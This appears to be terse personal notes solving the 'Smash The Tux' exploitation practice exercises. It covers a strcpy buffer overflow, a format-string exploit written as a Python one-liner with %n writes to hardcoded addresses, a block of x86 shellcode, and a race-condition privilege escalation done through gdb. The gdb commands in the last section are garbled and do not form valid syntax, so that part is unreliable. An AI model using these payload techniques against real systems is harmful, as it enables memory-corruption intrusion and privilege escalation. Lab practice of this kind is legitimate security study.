
# Smash The Tux

##0x00
- strcpy buffer overflow

simply pass in the large buffer and point to the address of the start of the buffer for your boomcode


##0x01
- format string, no validation

```bash
open('/tmp/foo.bin', 'wb').write("\xcc\xcc\xcc\xcc" + '\x54\x97\x04\x08' + '\x55\x97\x04\x08' + '\x56\x97\x04\x08' + '\x57\x97\x04\x08'+ 'A'*12 + '%5$n' + 'A'*0xD3 + '%6$n' + 'foobarbaZbar' + '%7$n' + 'A'*0xc0 + '%8$n' )
```

- some boom code
```bash
SHELLCODE += '\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff\xff\x62\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6d\x21\x0a\x0d'
```

0x02
- privilege escalation
- theres a race conditions for uid and accessing the file, so we will override the memory via gdb as user and show it works

objdump at stat, first add, change argv to be ".readthis"

bp call to fgets
gdb > x/16s 0xbset {char [size]}

`x/16s set charset {char[0x0a]} 0xbfffff8f5=".readthis"`


{charset ".readthis"

